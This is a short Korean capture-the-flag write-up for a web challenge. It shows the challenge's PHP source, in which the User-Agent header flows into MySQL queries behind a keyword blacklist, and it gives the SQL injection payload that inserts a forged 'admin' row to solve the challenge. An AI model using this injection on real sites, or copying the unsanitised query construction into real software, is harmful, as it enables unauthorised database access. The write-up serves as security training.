# 8

### First impression
```
<center>USER-AGENT

<br><br>done!  (19/70)
<!--

index.phps

-->



</center>
```

```
<html>
<head>
<title>Challenge 8</title>
<style type="text/css">
body { background:black; color:white; font-size:10pt; }
</style>
</head>
<body>
<br><br>
<center>USER-AGENT

<?

$agent=getenv("HTTP_USER_AGENT");
$ip=$_SERVER[REMOTE_ADDR];

$agent=trim($agent);

$agent=str_replace(".","_",$agent);
$agent=str_replace("/","_",$agent);

$pat="/\/|\*|union|char|ascii|select|out|infor|schema|columns|sub|-|\+|\||!|update|del|drop|from|where|order|by|asc|desc|lv|board|\([0-9]|sys|pass|\.|like|and|\'\'|sub/";

$agent=strtolower($agent);

if(preg_match($pat,$agent)) exit("Access Denied!");

$_SERVER[HTTP_USER_AGENT]=str_replace("'","",$_SERVER[HTTP_USER_AGENT]);
$_SERVER[HTTP_USER_AGENT]=str_replace("\"","",$_SERVER[HTTP_USER_AGENT]);

$count_ck=@mysql_fetch_array(mysql_query("select count(id) from lv0"));
if($count_ck[0]>=70) { @mysql_query("delete from lv0"); }


$q=@mysql_query("select id from lv0 where agent='$_SERVER[HTTP_USER_AGENT]'");

$ck=@mysql_fetch_array($q);

if($ck)
{ 
echo("hi <b>$ck[0]</b><p>");
if($ck[0]=="admin")

{
@solve();
@mysql_query("delete from lv0");
}


}

if(!$ck)
{
$q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");
echo("<br><br>done!  ($count_ck[0]/70)");
}


?>

<!--

index.phps

-->

</body>
</html>
```

### Trial and error
```
$q=@mysql_query("select id from lv0 where agent='$_SERVER[HTTP_USER_AGENT]'");

$ck=@mysql_fetch_array($q);

if($ck)
{ 
echo("hi <b>$ck[0]</b><p>");
if($ck[0]=="admin")

{
@solve();
@mysql_query("delete from lv0");
}


}
```
* 문제를 해결할 수 있는 가장 중요한 부분이라고 생각했다.
* 저 쿼리를 통과시켜 `admin`이라는 결과를 얻어낼 수 있다면 통과할 것 같다.
* 이미 `admin`이라는 레코드가 기록되어 있다고 가정하고 여러 SQLi를 날렸지만, 결과가 뜨지 않는 것을 보면 아무래도 해당 레코드가 없는 것 같다.

```
if(!$ck)
{
$q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");
echo("<br><br>done!  ($count_ck[0]/70)");
}
```
* 이 쿼리를 이용하여 의도적으로 원하는 레코드를 삽입하면 가능할 것 같다.
* `'r4k4\', \'$ip\', \'admin\'), (\'$agent'` 를 먼저 전송하여 원하는 레코드를 삽입한다.
* 그 다음 `r4k4`를 입력하여 `admin`이 나오도록 했고, 통과했다.

### Solution
* `User-Agent`에 다음과 같은 SQLi를 하여 원하는 레코드를 삽입한다.
	- `'r4k4\', \'$ip\', \'admin\'), (\'$agent'`
* `User-Agent`에 삽입한 레코드 값을 넣어 `admin`이 쿼리 결과로 나오도록 한다.
* 통과한다.